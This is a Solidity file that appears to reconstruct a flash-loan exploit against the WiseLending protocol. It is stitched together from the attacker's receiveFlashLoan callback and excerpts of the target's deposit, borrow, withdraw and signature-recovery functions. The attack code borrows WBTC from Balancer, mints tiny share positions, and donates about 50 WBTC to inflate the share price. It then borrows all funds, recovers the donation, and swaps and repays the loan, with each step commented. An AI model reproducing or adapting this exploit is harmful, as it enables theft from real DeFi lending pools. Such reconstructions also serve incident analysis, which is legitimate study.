function receiveFlashLoan(
    address[] memory tokens,
    uint256[] memory amounts,
    uint256[] memory feeAmounts,
    bytes memory userData
) external {
    recover = new Recover();
    uint256 recoverID = recover.init(); // open recover position

    uint256 borrowerID = PositionNFTs.mintPositionForUser(address(this)); // open borrower position

    WiseLending.depositExactAmount(recoverID, address(WBTC), 1); // deposit 1 WBTC to recover, mint 1 share
    WiseLending.depositExactAmount(borrowerID, address(WBTC), 1); // deposit 1 WBTC to borrower, mint 1 share

    WBTC.transfer(address(WiseLending), 50 * 1e8 - 2); // donate ~50 WBTC to WiseLending, inflate share price

    borrowAll(borrowerID);

    recover.recover(); // recover donated WBTC

    int256 swapAmount = -int256(amounts[0] - WBTC.balanceOf(address(this)));
    WETH_WBTC_Pair.swap(
        address(this), false, swapAmount, uint160(35_991_486_685_722_499_892_781_286_346_438_453), ""
    ); // swap WETH to WBTC
    WBTC.transfer(address(Balancer), amounts[0]); // repay flash loan
}

function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
    return this.onERC721Received.selector;
}

function depositExactAmount(
    uint256 _nftId,
    address _poolToken,
    uint256 _amount
)
    public
    syncPool(_poolToken)
    returns (uint256)
{
    uint256 shareAmount = calculateLendingShares(
        _poolToken,
        _amount
    );

    _handleDeposit(
        msg.sender,
        _nftId,
        _poolToken,
        _amount,
        shareAmount
    );

    _safeTransferFrom(
        _poolToken,
        msg.sender,
        address(this),
        _amount
    );

    return shareAmount;
}

function borrowExactAmount(
    uint256 _nftId,
    address _poolToken,
    uint256 _amount
)
    external
    syncPool(_poolToken)
    returns (uint256)
{
    WISE_SECURITY.checkOwnerPosition(
        _nftId,
        msg.sender
    );

    uint256 shares = calculateBorrowShares(
        _poolToken,
        _amount
    );

    _coreBorrowTokens(
        msg.sender,
        _nftId,
        _poolToken,
        _amount,
        shares
    );

    _safeTransfer(
        _poolToken,
        msg.sender,
        _amount
    );

    emit FundsBorrowed(
        msg.sender,
        _nftId,
        _poolToken,
        _amount,
        shares,
        block.timestamp
    );

    return shares;
}

function recover(bytes32 hash, bytes memory signature) internal pure returns (address) {
    // Check the signature length
    if (signature.length != 65) {
        revert("ECDSA: invalid signature length");
    }

    // Divide the signature in r, s and v variables
    bytes32 r;
    bytes32 s;
    uint8 v;

    // ecrecover takes the signature parameters, and the only way to get them
    // currently is to use assembly.
    // solhint-disable-next-line no-inline-assembly
    assembly {
        r := mload(add(signature, 0x20))
        s := mload(add(signature, 0x40))
        v := byte(0, mload(add(signature, 0x60)))
    }

    return recover(hash, v, r, s);
}

function getPseudoTotalPool(
    address _poolToken
)
    public
    view
    returns (uint256)
{
    return lendingPoolData[_poolToken].pseudoTotalPool;
}

function getTotalDepositShares(
    address _poolToken
)
    public
    view
    returns (uint256)
{
    return lendingPoolData[_poolToken].totalDepositShares;
}

function withdrawExactAmount(
    uint256 _nftId,
    address _poolToken,
    uint256 _withdrawAmount
)
    external
    syncPool(_poolToken)
    returns (uint256)
{
    uint256 withdrawShares = _preparationsWithdraw(
        _nftId,
        msg.sender,
        _poolToken,
        _withdrawAmount
    );

    _coreWithdrawToken(
        msg.sender,
        _nftId,
        _poolToken,
        _withdrawAmount,
        withdrawShares
    );

    _safeTransfer(
        _poolToken,
        msg.sender,
        _withdrawAmount
    );

    emit FundsWithdrawn(
        msg.sender,
        _nftId,
        _poolToken,
        _withdrawAmount,
        withdrawShares,
        block.timestamp
    );

    return withdrawShares;
}

function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
    WETH.transfer(address(WETH_WBTC_Pair), uint256(amount1Delta));
}
